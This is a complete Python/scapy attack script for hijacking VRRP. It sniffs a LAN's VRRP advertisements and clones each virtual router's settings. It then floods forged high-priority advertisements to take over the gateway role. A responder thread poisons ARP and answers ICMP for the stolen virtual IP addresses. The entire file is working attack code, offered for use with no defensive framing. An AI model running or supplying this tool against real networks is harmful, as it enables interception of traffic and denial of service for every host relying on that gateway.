#!/usr/bin/python

#import pprint
import getopt
import sys
import signal
import time
import threading
from scapy.all import *


def usage (progName):
	""" Print the program's usage and then sys.exit() """
	print ("Usage: %s -i <interface> -s <source_ip> -t <capture_time>" % progName)
	sys.stdout.flush ()
	sys.exit (0)

def handleArgs (argv):
	""" Handle arguments parsing """
	global iface, sourceIp, captureTime

	try:

		opts, args = getopt.getopt (argv[1:], "i:s:t:") 

	except getopt.GetoptError:

		usage (argv[0])

	for opt, arg in opts:

		if (opt == "-i"):
			iface = arg

		elif (opt == "-s"):
			sourceIp = arg

		elif (opt == "-t"):
			captureTime = int (arg)


def sigintHandler (signal, frame):
	global eventRun
	print ("\t[!]\tCaugth SIGINT, exiting...")
	sys.stdout.flush ()
	# Clean version: set the global event "run" to false to stop the main loop
	eventRun.clear ()
	# Not so clean version
	# sys.exit (0)




class vrrp ():
	""" VRRP packet definition """
	content = ''

	def __init__ (self, srcIp, vrrpParams):
		nbrIp = 0

		for ip in vrrpParams['addrlist']:
			nbrIp += 1

		self.content = Ether (src = "00:00:5e:00:01:" + hex (vrrpParams['vrid']), dst = "01:00:5e:00:00:12", type = 0x0800)
		self.content = self.content / IP (src = srcIp, dst="224.0.0.18", proto = 0x70, ttl = 255)
		self.content = self.content / VRRP (version = vrrpParams['version'], type = 0x001, vrid = vrrpParams['vrid'], priority = 250, ipcount = nbrIp, authtype = 0, adv = vrrpParams['adv'], addrlist = vrrpParams['addrlist'])

	def send (self, interface):
		sendp (self.content, iface = interface, verbose = False)



class arp ():
	""" ARP packet definition """
	global iface
	content = ''

	def __init__ (self, dstMac, srcMac, dstIp, srcIp):
		self.content = Ether (dst = dstMac,src = srcMac, type = 0x806)
		self.content = self.content / ARP (op = "is-at", hwdst = dstMac, hwsrc = srcMac, pdst = dstIp, psrc = srcIp)

	def send (self, interface):
		sendp (self.content, iface = interface, verbose = False)



class icmp ():
	""" ICMP packet definition """
	global iface
	content = ''

	def __init__ (self, dstMac, srcMac, dstIp, srcIp, icmpId, icmpSeq):
		self.content = Ether (dst = dstMac,src = srcMac, type = 0x800)
		self.content = self.content / IP (dst = dstIp, src = srcIp, proto = "icmp")
		self.content = self.content / ICMP (type = "echo-reply", code = 0, id = icmpId , seq = icmpSeq)

	def setPayload (self, payload):
		self.content = self.content / Raw (load = payload)

	def send (self, interface):
		sendp (self.content, iface = interface, verbose = False)



class responder (threading.Thread):
	""" ARP / ICMP interceptor thread definition """
	vips = []
	global iface, eventRun

	def __init__ (self, vips):
		threading.Thread.__init__(self)
		self.vips = vips

		# Send a gratuitous ARP once preempt has been done
		for vip in self.vips:
			gArp = arp ("ff:ff:ff:ff:ff:ff", get_if_hwaddr (iface), "255.255.255.255", vip)
			gArp.send (iface)

	def sendReply (self, frame):
		# Check if the frame is a correct ARP frame. Needed because first captured packet ain't filtered by sniff()
		if (frame.haslayer ('ARP') and frame['ARP'].pdst in self.vips):
			arpReply = arp (frame[Ether].src, get_if_hwaddr (iface), frame['ARP'].psrc, frame['ARP'].pdst)
			arpReply.send (iface)

		# Check if the frame is an ICMP frame
		elif (frame.haslayer ('ICMP') and frame['IP'].dst in self.vips):
			icmpReply = icmp (frame[Ether].src, get_if_hwaddr (iface), frame['IP'].src, frame['IP'].dst, frame['ICMP'].id, frame['ICMP'].seq)

			if frame.haslayer ('Raw'):
				icmpReply.setPayload (frame['Raw'].load)

			icmpReply.send (iface)

	def run (self):
		captureFilter = "(arp and ether dst host ff:ff:ff:ff:ff:ff) or icmp"
		print ("\t[*]\tStarting ARP / ICMP responder")
		sys.stdout.flush ()

		try:
			capturedFrames = sniff( iface = iface, count = 0, prn = self.sendReply, store = 0, filter = captureFilter, timeout = None )

		
		except:
			print ("\t[!]\tProblem handling ARP frames. Exiting...")
			sys.stdout.flush ()
			# Set the "eventRun" event to False to stop the main while loop
			eventRun.clear()






###############################  Main  ################################

# Global variables with default values
iface = "eth0"
sourceIp = "192.168.1.254"
captureTime = 10

vrrpObjs = []
vips = []
arpObjs = []

# Create a event (True/False flag) and set it to True
eventRun = threading.Event ()
eventRun.set ()

# Initialize the SIGINT handler
signal.signal (signal.SIGINT, sigintHandler)

# Parse command line args
handleArgs (sys.argv)

# Try to capture VRRP traffic
print ("\t[*]\tLooking for VRRP frames")
sys.stdout.flush ()
captureFilter = "dst host 224.0.0.18 and ether dst host 01:00:5e:00:00:12"

try:
	capturedFrames = sniff (iface = iface, count = 0, prn = None, store = 1, filter = captureFilter, timeout = captureTime)

except:
	print ("\t[!]\tProblem during VRRP frames sniffing (are you r00t?), exiting")
	sys.exit (1)

# Exit if no VRRP frame has been captured
if (len (capturedFrames) == 0):
	print ("\t[!]\tNo VRRP frame captured. Exiting...")
	sys.exit (0)

# Extract VRRP configuration from every captured frame
print ("\t[*]\tProcessing captured frames")
sys.stdout.flush ()

for frame in capturedFrames:
	curFrame = {}
	knownVrid = False

	# Continue if the frame ain't a VRRP one
	if (not frame.haslayer (VRRP)):
		continue

	# If the current virtual router ID is already known, skip this frame
	for vrrpObj in vrrpObjs:
		
		if (frame[VRRP].vrid == vrrpObj.content[VRRP].vrid):
			knownVrid = True
			break

	# If the vrid of the current VRRP frame is known
	if (knownVrid):
		continue
		
	# Save the current VRRP config
	curFrame['version'] = frame[VRRP].version
	curFrame['vrid'] = frame[VRRP].vrid
	curFrame['adv'] = frame[VRRP].adv
	curFrame['addrlist'] = frame[VRRP].addrlist
	curFrame['auth1'] = frame[VRRP].auth1
	curFrame['auth2'] = frame[VRRP].auth2

	# Create a vrrp instance from curent VRRP configuration
	curVrrpObj = vrrp (sourceIp, curFrame)
	vrrpObjs.append (curVrrpObj)
	
	# Gather VIP informations for ARP poisoning
	vips = vips + curFrame['addrlist']

responderThread = responder (vips)
# Enable the daemon mode wich will kill the thread if the main process is killed
responderThread.daemon = True
responderThread.start ()


# Main loop
print ("\t[*]\tStarting VRRP poisoning")
sys.stdout.flush ()

while (eventRun.isSet ()):

	for vrrpObj in vrrpObjs:
		vrrpObj.send (iface)

	time.sleep (1)
